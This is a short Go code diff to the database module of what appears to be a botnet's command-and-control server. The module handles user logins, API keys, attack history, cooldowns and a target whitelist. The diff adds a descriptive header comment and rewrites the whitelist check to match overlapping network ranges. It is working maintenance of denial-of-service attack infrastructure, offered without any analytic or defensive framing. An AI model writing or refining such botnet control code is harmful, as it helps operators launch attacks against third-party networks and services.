@@ -10,6 +10,18 @@ import (
 	_ "github.com/go-sql-driver/mysql"
 )
 
+/* ============================================================================
+ * DATABASE MODULE - MySQL/MariaDB Integration
+ * ============================================================================
+ * Tables: users, history, whitelist, logins, online
+ * Features:
+ *   - User authentication with login logging
+ *   - Attack history tracking
+ *   - IP whitelist protection
+ *   - API key validation
+ *   - Cooldown and duration limits
+ * ============================================================================ */
+
 type Database struct {
 	db *sql.DB
 }
@@ -116,7 +128,7 @@ func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
 }
 
 func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
-	for prefix, netmask := range attack.Targets {
+	for addr, netmask := range attack.Targets {
 		rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
 		if err != nil {
 			return false
@@ -129,7 +141,9 @@ func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
 			// Parse netmask as integer, not duration
 			dbNetmaskInt := 32
 			fmt.Sscanf(dbNetmask, "%d", &dbNetmaskInt)
-			if prefix == dbPrefixInt && uint8(dbNetmaskInt) == netmask {
+			
+			// Check if target overlaps with whitelisted range
+			if netshift(addr, netmask) == netshift(dbPrefixInt, uint8(dbNetmaskInt)) {
 				rows.Close()
 				return true
 			}
